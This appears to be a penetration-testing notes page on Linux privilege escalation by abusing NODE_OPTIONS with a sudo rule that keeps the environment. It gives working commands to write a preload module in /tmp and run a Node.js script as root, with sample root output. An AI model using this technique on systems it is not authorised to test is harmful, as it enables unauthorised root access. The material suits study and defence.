---
Primary_category: "[[LINUX PRIVESC]]"
title: "ENVIRONMENT VARIABLE ABUSE"
draft: false
banner: "https://images.unsplash.com/photo-1589763472885-46dd5b282f52?q=80&w=1748&auto=format&fit=crop&ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D"
banner_y: 0.88286
tags:
cssclasses:
---

###### PRIMARY CATEGORY → [[LINUX PRIVESC]]

#### *NODE_OPTIONS Module Preloading*

##### *Workflow*

Node.js accepts startup options through the **`NODE_OPTIONS`** environment variable.

The **`--require=<MODULE_PATH>`** option loads a module before the main script starts. Code at the top level of that module executes with the privileges of the Node.js process.

Therefore, controlling **`NODE_OPTIONS`** received by a privileged Node.js process can provide command execution as that user.

With *sudo*, this may occur when **`!env_reset`** allows the variable to survive. The effective **`env_delete`** and **`env_check`** settings must also permit it.

> ***An exported variable is inherited by processes launched from that shell. Affecting another user's process requires control over the environment that process receives.***

##### *Requirements*

- ***A Node.js command that can be started as a more privileged user***

- ***Control over the `NODE_OPTIONS` variable received and accepted by that process***

- ***A writable location for a module readable by the privileged process***

- ***A complete command invocation permitted by the applicable sudo rule***

##### *Abuse*

###### *Checking Sudo Privileges*

```bash
sudo -l
```

Suppose the relevant entries are:

> [!TLDR]- *Command Output*
>
> ```bash
> !env_reset
> (root) NOPASSWD: /usr/bin/web-scraper /root/web_src_downloaded/*.html
> ```

The rule permits running **`web-scraper`** as root with an argument matching the specified HTML path pattern.

###### *Inspecting the Script*

```bash
head -n 1 /usr/bin/web-scraper
```

> [!TLDR]- *Command Output*
>
> ```bash
> #!/usr/bin/env node
> ```

The shebang starts Node.js, which processes **`NODE_OPTIONS`** during startup.

###### *Creating the Module*

Create a CommonJS module that executes **`id`** and exits immediately afterwards:

```bash
cat > /tmp/preload.cjs <<'EOF'
const { execSync } = require('child_process');
try {
    console.log(execSync('id', { encoding: 'utf-8' }));
} catch (e) {}
process.exit(0)
EOF
```

The **`.cjs`** extension explicitly identifies the file as a CommonJS module.

###### *Executing the Privileged Command*

Supply **`NODE_OPTIONS`** in the environment of the sudo invocation:

```bash
NODE_OPTIONS='--require=/tmp/preload.cjs' sudo --user root -- /usr/bin/web-scraper /root/web_src_downloaded/probe.html
```

The argument matches the sudo rule. The preload executes before the scraper accesses the HTML file.

Successful execution as root produces output such as:

> [!TLDR]- *Command Output*
>
> ```bash
> uid=0(root) gid=0(root) groups=0(root)
> ```

The module's top-level code runs as root. Its **`process.exit(0)`** call terminates Node.js after the verification command.

> ***The `secure_path` setting controls executable lookup. It can prevent PATH hijacking while still allowing Node.js to load an absolute module path supplied through `NODE_OPTIONS`.***